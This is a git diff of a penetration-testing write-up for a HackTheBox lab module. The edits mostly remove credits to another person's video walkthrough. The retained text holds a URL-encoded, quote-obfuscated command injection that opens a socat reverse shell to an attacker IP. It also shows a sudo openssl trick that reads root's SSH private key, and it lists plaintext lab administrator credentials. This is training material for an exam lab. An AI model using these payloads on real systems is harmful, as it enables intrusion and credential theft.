@@ -6,8 +6,6 @@ tags: [CPTS]
 ---
 Attacking Enterprise Networks is the final module for the HackTheBox Certified Penetration Tester Specialist career pathway. It attempts to combine all of the concepts that the student has learned from all of the previous modules and best emulates the 10-day penetration test examination expected to be taken after completing said modules. Other security professionals state that an effective way to prepare for the examination is to attempt this module blind as a black-box penetration test, only working off of the given domain name and ip address to find all of the flags in the simulated Active Directory domain. 
 
-Credit to Yerald Leiva on YouTube for his voiceless walkthrough which helped me navigate this box. This is the first full-scale blackbox engagement that I ever attempted, and whenever I got stuck his videos helped me on further tuning my methodology. 
-
 ### First Flag:
 
 The first flag was found using the following command:
@@ -262,7 +260,7 @@ HTB{bdd8a93aff53fd63a0a14de4eba4cbc1}
 
 ### Eleventh Flag:
 
-Since we have command execution, we can try using a reverse shell. I had a bit of trouble getting a reverse shell to work. I got a tip from Yerald Leiva's video where he used a socat shell. I tried the following url encoded command on BurpSuite:
+Since we have command execution, we can try using a reverse shell. I tried the following url encoded command on BurpSuite:
 ```
 127.0.0.1%0a's'o'c'a't'%09TCP%3A10.10.16.41%3A4443%09EXEC%3A%2Fb'i'n%2Fbash
 ```
@@ -301,7 +299,7 @@ There is probably a flag in /root but unfortunately I can't cd to /root as the s
 User srvadm may run the following commands on dmz01:
     (ALL) NOPASSWD: /usr/bin/openssl
 ```
-Since we have sudo command on /usr/bin/openssl, we will check GTFOBINS for an exploit. There is a sudo exploit on GTFOBINS, but it did not work in getting me root access. I checked Yerald's video and see that he has two commands to get root:
+Since we have sudo command on /usr/bin/openssl, we will check GTFOBINS for an exploit. There is a sudo exploit on GTFOBINS, but it did not work in getting me root access. I used the below command to display the id_rsa file in the root folder using openssl with root privilege.
 ```
 LFILE=/root/.ssh/id_rsa
 sudo /usr/bin/openssl enc -in $LFILE
@@ -477,14 +475,8 @@ proxychains firefox 172.16.8.20
 However it does not seem to load. The problem was probably that SOCKS4 proxychains was not supported, so we change to the newer SOCKS5 which has UDP and authentication support by changing socks4 to socks5 in proxychains.conf. 
 We then rerun the above command. We also change the browser network settings for firefox to manual proxy with the loopback address and port set for SOCK5. 
 
-I had issues for a few hours getting proxychains to work. I eventually had to reinstall proxychains with 
-```
-sudo apt-get remove --purge proxychains
-sudo apt-get autoremove
-sudo apt-get update
-sudo apt-get install proxychains
-```
-We then try to get to the login page of 172.16.8.20 since we have administrator credentials to test. It seems very slow to load. 
+We then try to get to the login page of 172.16.8.20 since we have administrator credentials to test. It seems very slow to load.
+We enter the credentials below and then 
 ```
 Administrator
 D0tn31Nuk3R0ck$$@123
